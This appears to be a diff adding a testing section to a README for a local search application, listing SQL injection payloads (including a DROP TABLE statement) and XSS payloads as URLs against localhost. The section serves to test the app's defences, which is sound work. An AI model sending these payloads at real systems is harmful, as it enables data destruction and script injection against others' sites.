@@ -37,3 +37,33 @@ Search examples:
 ```bash
 curl -X POST -d "searchTerm=Gold" http://localhost:3000/search
 ```
+
+## SQL Injection and XSS Attempts
+
+SQL Injection attempts (via GET /search):
+
+```text
+# Basic SQL injection attempts
+http://localhost:3000/search?searchTerm=Black' OR '1'='1
+http://localhost:3000/search?searchTerm=Black' UNION SELECT 'hack','test
+http://localhost:3000/search?searchTerm='; SELECT * FROM reviews; --
+
+# More complex attempts
+http://localhost:3000/search?searchTerm=' OR game LIKE '%
+http://localhost:3000/search?searchTerm='; DROP TABLE reviews; --
+```
+
+XSS attempts (try both GET and POST /search):
+
+```text
+# Basic script injection
+http://localhost:3000/search?searchTerm=<script>alert('xss')</script>
+
+# Event handlers
+http://localhost:3000/search?searchTerm=<img src="x" onerror="alert('xss')">
+http://localhost:3000/search?searchTerm=<body onload="alert('xss')">
+
+# More subtle attempts
+http://localhost:3000/search?searchTerm=<div onmouseover="alert('xss')">hover me</div>
+http://localhost:3000/search?searchTerm=javascript:alert('xss')//
+```
